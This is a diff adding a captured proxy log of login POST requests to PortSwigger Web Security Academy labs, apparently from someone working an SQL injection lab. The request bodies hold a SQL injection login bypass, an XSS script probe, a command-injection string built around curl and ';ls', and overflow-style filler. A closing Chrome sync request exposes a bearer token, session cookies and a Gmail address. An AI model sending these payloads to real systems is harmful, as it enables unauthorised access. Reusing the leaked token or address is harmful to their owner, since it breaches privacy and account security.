@@ -1,0 +1,457 @@
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 167
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=curl+%22http%3A%2F%2Fexample.com%3Fuser%3Dadmin%3Bls%22&password=curl+%22http%3A%2F%2Fexample.com%3Fuser%3Dadmin%3Bls%22'
+
+---
+
+URL: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56462, 0, 0)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 443)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 81
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=8koeSwez9vZExl7HXu8XRJcO3Z5FY3gw
+priority: u=0, i
+
+Body:
+
+b'csrf=3NTdkxXW8lYMwhm6PO2StvGtgmpEmrSr&username=subprocess.call&password=test_pass'
+
+---
+
+URL: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56466, 0, 0)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 443)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 81
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+origin: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=8koeSwez9vZExl7HXu8XRJcO3Z5FY3gw
+priority: u=0, i
+
+Body:
+
+b'csrf=3NTdkxXW8lYMwhm6PO2StvGtgmpEmrSr&username=subprocess.call&password=test_pass'
+
+---
+
+URL: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56471, 0, 0)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 443)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 81
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=8koeSwez9vZExl7HXu8XRJcO3Z5FY3gw
+priority: u=0, i
+
+Body:
+
+b'csrf=3NTdkxXW8lYMwhm6PO2StvGtgmpEmrSr&username=subprocess.call&password=test_pass'
+
+---
+
+URL: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56477, 0, 0)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 443)", 'SNI': '0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 472
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0ac200f10357cbe7d9e87709001f00f8.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=8koeSwez9vZExl7HXu8XRJcO3Z5FY3gw
+priority: u=0, i
+
+Body:
+
+b'csrf=3NTdkxXW8lYMwhm6PO2StvGtgmpEmrSr&username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&password=test_passs'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 84
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=E1r4tlObJx7vEbNkATeeQxb3DYz9yFlJ
+priority: u=0, i
+
+Body:
+
+b'csrf=cGOsQONrzfR5MHsVN9yXxm1tCIdO6kLT&username=administrator%27--&password=test_pass'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 159
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=%3Cscript%3Ealert%28%27XSS_TEST%27%29%3C%2Falert%3E&password=%3Cscript%3Ealert%28%27XSS_TEST%27%29%3C%2Falert%3E'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 820
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 116
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=%3Cscript%3Ealert%28%27XSS_TEST%27%29%3C%2Falert%3E&password=test_xss'
+
+---
+
+URL: https://clients4.google.com/chrome-sync/command/?client=Google+Chrome&client_id=LcoRoaSjneqseoNT1RGQtw%3D%3D
+Client Connection Details: {'Address': "('::1', 56075, 0, 0)", 'SNI': 'clients4.google.com', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('clients4.google.com', 443)", 'SNI': 'clients4.google.com', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 2315
+pragma: no-cache
+cache-control: no-cache
+authorization: Bearer ya29.a0AeDClZBEXRF5n3AfEZ1YsdYcMsy5TPqkzV9vN3bYzgdC71ioVPQFv3VUy5fKAN606S5gkJG4RZimKIIhcwY0IjtXnm2iDLT1xPt6FxH8lkNNDPkZzv9VYhEdEQXXB87Lidma5NLEKFyCGASzT8AfeG35_GOFMOKkk4GihWSmxSF8nls8R9SHPlo8yCiV27GYX45xz1ntqqEvnVXM0LykSqP0lV4lW3P1kcGqWKWasBd9nswOzYLByRlVZZMI0VviI_lISVqoEFSgNtW1BhwaCgYKARsSARASFQHGX2MijyX389PC1W-Unm-hrYyFzg0282
+content-encoding: gzip
+user-agent: Chrome WIN 130.0.6723.92 (ef4f16c57010eb3e047ef101019b869296173bd9-refs/branch-heads/6723@{#1518}) channel(stable)
+content-type: application/octet-stream
+x-client-data: CKy1yQEIjLbJAQimtskBCKmdygEImOvKAQiWocsBCPqYzQEIhaDNAQipns4BCP2lzgEI+r7OAQiSxs4BCJfLzgEIw8zOAQjGzM4BCNnMzgEIj83OARicsc4BGMO9zgEY/8nOAQ==
+sec-fetch-site: none
+sec-fetch-mode: no-cors
+sec-fetch-dest: empty
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+priority: u=4, i
+
+Body:
+
+b'\n\x14hiqahsh123@gmail.com\x10c\x18\x01"\xca1\n\xad\x07\n$9a180e7a-b860-4a4d-9441-e841225b1966 \x00(\xe6\xce\xe7\x98\xaf20\xe6\xce\xe7\x98\xaf2:\x9e\x03username|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x01\x00\xaa\x01\xb0\x03\x8a\xbf\x0f\xab\x03\n\x08username\x12\x95\x03AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x80\xb3\xd1\xad\xbe\x93\xe1\x17\xba\x01\x1cneeKOA0/N7F6+QpoWl0MqW1oWSo=\n\x9b\x02\nfZ:ADqtAZyi986rBrys53QKZ/SvJxW/bGO0ILopxuWd7l29lAKN859wiZwB/tX+8z0CLftesLjiwwqR18Kyx7zVwiUeDxeoIEuzHQ== \xfa\xbf\xc1\xdd\xd9\xc0\x89\x03(\xa6\xc6\xe8\x98\xaf20\xf0\x8a\xe5\x98\xaf2:2username|%3Cscript%3Ealert(\'XSS_TEST\')%3C/alert%3E\x90\x01\x00\xaa\x01C\x8a\xbf\x0f?\n\x08username\x12!<script>alert(\'XSS_TEST\')</alert>\x18\x80\xf6\xcd\x99\xbe\x93\xe1\x17\x18\xc0\xf6\xe4\xb4\xbe\x93\xe1\x17\xba\x01\x1cvMYJ2CW/Lws8TtylqbIpapIXTiI=\n\xa3\x01\nfZ:ADqtAZzu3q0IH42snYfynELkIosH2KZ6lmerhmn2pznBUrSF7GSxbvRXIyZCuSQRlnL3msohuXWlhiOpSKnC80Ee37x7uC3Bjg== \xfa\xbf\xc1\xdd\xd9\xc0\x89\x03(\xfe\xd4\xe7\x98\xaf2:\x00\x90\x01\x01\xaa\x01\x04\xba\xbc\x18\x00\xba\x01\x1cKM3msEURIuUHQUk+SnDR2MbrWHI=\n\xd2\x12\nfZ:ADqtAZzu3q0IH42snYfynELkIosH8CHdW/iGgqcnKuFNeqvN5b+uHI6EWus9wyLEzDGGMZZOc1x4fTwLqm5hreItpANhz3IUKg== \xfa\xbf\xc1\xdd\xd9\xc0\x89\x03(\xb6\xc9\xe8\x98\xaf20\x8f\xb3\xca\x98\xaf2:\tHAIQAHASH\x90\x01\x00\xaa\x01\xa2\x11\xba\xbc\x18\x9d\x11\n\x18LcoRoaSjneqseoNT1RGQtw==\x1a\xfe\x10\x08\xc3\x8d\xe4l\x10\x9d\x8a\xe4l\x18\x00 \x06(\x002\x00:\x86\x02\x12Bhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/\x1a\x18https://portswigger.net/"1SQL injection vulnerability allowing login bypass0\x00@\x95\x06H\x8e\xb3\xca\x98\xaf2P\x00X\x00`\x00x\xa6\xaa\xb8\xc9\xbc\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x01:\xb5\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aBhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/"1SQL injection vulnerability allowing login bypass0\x00@\xa2\x06H\xa7\xbd\xe0\x98\xaf2P\x00X\x00`\x00x\xaf\xfd\xf7\xf5\xbd\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\xd0\x02\x12]https://0aa500830453a34280df0d5500f90007.web-security-academy.net/my-account?id=administrator\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"1SQL injection vulnerability allowing login bypass0\x07@\xa7\x06H\xd8\xe6\xe2\x98\xaf2P\x00X\x00`\x00x\x91\xa4\x8b\x88\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x01:\xcb\x02\x12Bhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/\x1a]https://0aa500830453a34280df0d5500f90007.web-security-academy.net/my-account?id=administrator"1SQL injection vulnerability allowing login bypass0\x00@\xa9\x06H\xe0\x83\xe3\x98\xaf2P\x00X\x00`\x00x\xe6\xad\xee\x89\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x01:\xb5\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aBhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/"1SQL injection vulnerability allowing login bypass0\x00@\xab\x06H\xb4\xa4\xe5\x98\xaf2P\x01X\x00`\x00x\xb8\xb6\xbd\x9b\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\xba\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"1SQL injection vulnerability allowing login bypass0\x07@\xaf\x06H\xfa\xd4\xe7\x98\xaf2P\x00X\x00`\x00x\xb1\xdb\x88\xae\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\x89\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"\x000\x07@\xb1\x06H\xae\xc9\xe8\x98\xaf2P\x00X\x00`\x00x\x9b\x93\x96\xb5\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xf4\x03\xc8\x01\x06\xd0\x01\x01h\x01p\xb0\xf5\xe1\x98\xaf2 \x05\xba\x01\x1cV6rkYb+H7S2NMEx2jyAjOQNmKhg=\n\xdf\x04\n$a1d3e367-597a-46c9-a911-e96b20a2a0da \x00(\x80\xd5\xe7\x98\xaf20\x80\xd5\xe7\x98\xaf2:`LcoRoaSjneqseoNT1RGQtw==-https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x90\x01\x00\xaa\x01\xa1\x03\x8a\xd9\xd6\x03\x9b\x03\x08\xb8\xb6\xbd\x9b\xbe\x93\xe1\x17\x12\x18LcoRoaSjneqseoNT1RGQtw==\x1a\x82\x01\x08\x94\x9b\x04\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1a1SQL injection vulnerability allowing login bypass \x00"\n\x08\x00\x10\x00\x18\x01 \x00(\x00(\x92\x9b\x040\x008\x99\xad\xcb\x12@\x01H\x9d\x8a\xe4lP\xc3\x8d\xe4lX\xb9\xd9\xeb\x8a\xbe\x93\xe1\x17`\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01h\xa4\xac\xb5\x9a\xbe\x93\xe1\x17p\xc8\x01z\x02en\x80\x01\x00\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\x92\x01Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x98\x01\x00\xa0\x01\x00\xa8\x01\x00\xb0\x01\x00\xb8\x01\x00\xba\x01\x1c08NHzH5Q2f0mJVfOwwFHlCsNxkI=\n\xdd\x04\n$4d5913f5-8b31-4ec8-ad4a-cfd8df310d91 \x00(\xb4\xc9\xe8\x98\xaf20\x80\xd5\xe7\x98\xaf2:`LcoRoaSjneqseoNT1RGQtw==-https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x90\x01\x00\xaa\x01\x9f\x03\x8a\xd9\xd6\x03\x99\x03\x08\xb1\xdb\x88\xae\xbe\x93\xe1\x17\x12\x18LcoRoaSjneqseoNT1RGQtw==\x1a\x82\x01\x08\x95\x9b\x04\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1a1SQL injection vulnerability allowing login bypass \x00"\n\x08\x07\x10\x00\x18\x00 